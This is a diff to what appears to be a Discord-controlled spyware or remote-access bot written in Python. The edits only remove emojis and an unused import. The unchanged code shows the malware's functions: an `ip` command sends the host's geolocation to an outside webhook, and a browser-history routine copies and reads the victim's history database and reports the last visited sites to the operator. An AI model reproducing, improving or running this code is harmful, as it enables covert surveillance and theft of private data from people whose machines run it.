@@ -21,7 +21,6 @@ import subprocess
 import sys
 import ctypes
 import uuid
-import imageio
 from PIL import Image  
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
@@ -257,10 +256,10 @@ async def ip(ctx):
             ip_info = "Failed to get IP info."
 
         
-        payload = {"content": f"🔍 **IP Geolocation Report**\n{ip_info}"}
+        payload = {"content": f"**IP Geolocation Report**\n{ip_info}"}
         requests.post(WEBHOOK_URL, json=payload)
 
-        await ctx.send("✅ Sent IP geolocation to the webhook!")
+        await ctx.send("Sent IP geolocation to the webhook!")
 
     except Exception as e:
         await ctx.send(f"Error: {e}")
@@ -279,12 +278,12 @@ def get_browser_history(browser_name):
         }
 
         if browser_name not in browser_paths:
-            return f"❌ Unsupported browser: {browser_name}"
+            return f"Unsupported browser: {browser_name}"
 
         history_db = browser_paths[browser_name]
 
         if not os.path.exists(history_db):
-            return f"❌ {browser_name} history file not found."
+            return f"{browser_name} history file not found."
 
         
         temp_db = f"temp_{browser_name.lower()}_history.db"
@@ -302,14 +301,14 @@ def get_browser_history(browser_name):
         os.remove(temp_db)  
 
         if not history:
-            return f"📜 No browsing history found for {browser_name}."
+            return f"No browsing history found for {browser_name}."
 
         
         history_text = "\n".join([f"🔗 {title} ({url})" for url, title in history])
-        return f"📜 **Last 10 Browsed Sites on {browser_name}:**\n{history_text}"
+        return f"**Last 10 Browsed Sites on {browser_name}:**\n{history_text}"
 
     except Exception as e:
-        return f"❌ Error retrieving {browser_name} history: {e}"
+        return f"Error retrieving {browser_name} history: {e}"
 
 @bot.command()
 async def browser(ctx):
